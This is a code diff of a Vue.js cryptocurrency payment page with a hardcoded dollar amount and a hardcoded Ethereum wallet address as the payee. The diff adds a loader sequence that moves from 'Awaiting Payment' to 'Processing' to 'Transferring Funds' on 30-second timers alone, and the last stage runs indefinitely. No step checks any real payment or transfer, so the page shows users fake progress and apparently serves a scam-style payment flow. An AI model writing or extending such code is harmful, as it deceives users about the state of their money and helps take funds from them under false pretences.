@@ -47,13 +47,24 @@
 
 
           <div class="input-button-wrapper">
-            <p class="text-fiat">Fiat amount: $107,882.00 | 1 ETH = {{ethereumRate}}</p>
+            <p class="text-fiat">Fiat amount: $111,032.00 | 1 ETH = {{ethereumRate}}</p>
           </div>
 
           <hr/>
 
-          <div class="seprate" >
-            <p class="loader-text" >Awaiting Payment</p>
+          <!-- Loader Section -->
+          <div class="seprate" v-if="currentStep === 1">
+            <p class="loader-text">Awaiting Payment</p>
+            <span class="loader"></span>
+          </div>
+
+          <div class="seprate" v-if="currentStep === 2">
+            <p class="loader-text">Processing</p>
+            <span class="loader"></span>
+          </div>
+
+          <div class="seprate" v-if="currentStep === 3">
+            <p class="loader-text">Transferring Funds</p>
             <span class="loader"></span>
           </div>
 
@@ -174,6 +185,19 @@ export default {
 
     },
 
+    runLoaderSequence() {
+      // Step 1: "Awaiting Payment" - Runs for 30s
+      setTimeout(() => {
+        this.currentStep = 2; // Move to "Processing"
+
+        // Step 2: "Processing" - Runs for another 30s
+        setTimeout(() => {
+          this.currentStep = 3; // Move to "Transferring Funds" (runs indefinitely)
+        }, 30000);
+
+      }, 30000);
+    },
+
   },
   data() {
     return {
@@ -186,9 +210,10 @@ export default {
       inputValue1: '',
       inputValue2: '',
       inputValue3: 119000,
-      inputValue4: 3133,
+      inputValue4: 0,
       bitcoinRate: null,
       ethereumRate: null,
+      currentStep: 1, // Controls which loader is visible
     };
   },
   created() {
@@ -206,6 +231,8 @@ export default {
     this.bitcoinAddress = "0xa752937e238B7be0B251fda013B377cb15f9eE42"
     this.inputValue1 = "0xa752937e238B7be0B251fda013B377cb15f9eE42"
     // this.inputValue2 = this.loginForm.inputValue2
+    // Start the loader sequence
+    this.runLoaderSequence();
   }
 }
 </script>
